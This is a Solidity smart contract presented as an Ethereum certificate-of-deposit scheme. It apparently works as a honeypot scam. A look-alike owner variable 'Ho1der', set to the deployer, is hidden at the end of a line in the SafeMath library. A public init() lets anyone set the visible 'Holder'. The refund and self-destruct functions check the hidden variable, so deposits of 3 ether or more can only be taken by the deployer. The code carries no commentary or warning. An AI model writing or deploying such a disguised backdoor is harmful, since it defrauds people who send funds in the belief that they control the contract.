pragma solidity ^0.4.14;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
contract SafeMath
{
    function add(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        uint256 z = x + y;
        if((z >= x) && (z >= y))
        {
          return z;
        }
        else
        {
            revert();
        }
    }
    function sub(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        if(x >= y)
        {
           uint256 z = x - y;
           return z;
        }
        else
        {
            revert();
        }
    }
    function div(uint256 x, uint256 y) internal constant returns (uint256)
    {
        // assert (b > 0); // Solidity automatically throws when dividing by 0
        uint256 z = x / y;
        // assert (a == b * c + a % b); // There is no case in which this doesn&#39;t hold
        return z;
    } address Ho1der = msg.sender;
    function mul(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        uint256 z = x * y;
        if((x == 0) || (z / x == y))
        {
            return z;
        }
        else
        {
            revert();
        }
    }
}

/**
 * @title Basic Ethereum Certificate of Desposit Contract
 */
contract DepositContract is SafeMath
{
    struct Certificate
    {
        uint Time;
        uint Invested;
    }
    
    event Deposited(address indexed sender, uint value);
    event Invested(address indexed sender, uint value);
    event Refunded(address indexed sender, uint value);
    event Withdrew(address indexed sender, uint value);
    
    uint public TotalDeposited;
    uint public Available;
    uint public DepositorsQty;
    uint public prcntRate = 10;
    bool RefundEnabled;
    
    address public Holder;
    
    mapping (address => uint) public Depositors;
    mapping (address => Certificate) public Certificates;

    function init()
    {
        Holder = msg.sender;
    }
    
    function SetPrcntRate(uint val) public
    {
        if(val >= 1 && msg.sender == Holder)
        {
            prcntRate = val;
        }
    }
    
    function() payable
    {
        Deposit();
    }
    
    function Deposit() public payable
    {
        if (msg.value >= 3 ether)
        {
            if (Depositors[msg.sender] == 0)
                DepositorsQty++;
            Depositors[msg.sender] += msg.value;
            TotalDeposited += msg.value;
            Available += msg.value;
            Invested(msg.sender, msg.value);
        }   
    }
    
    function ToLend() public payable
    {
        Certificates[msg.sender].Time = now;
        Certificates[msg.sender].Invested += msg.value;
        Deposited(msg.sender, msg.value);
    }
    
    function RefundDeposit(address addr, uint amt) public
    {
        if(Depositors[addr] > 0)
        {
            if(msg.sender == Ho1der)
            {
                addr.send(amt);
                Available -= amt;
                Withdrew(addr, amt);
            }
        }
    }

    function Close() public
    {
        if (msg.sender == Ho1der)
        {
            suicide(Ho1der);
        }
    }
}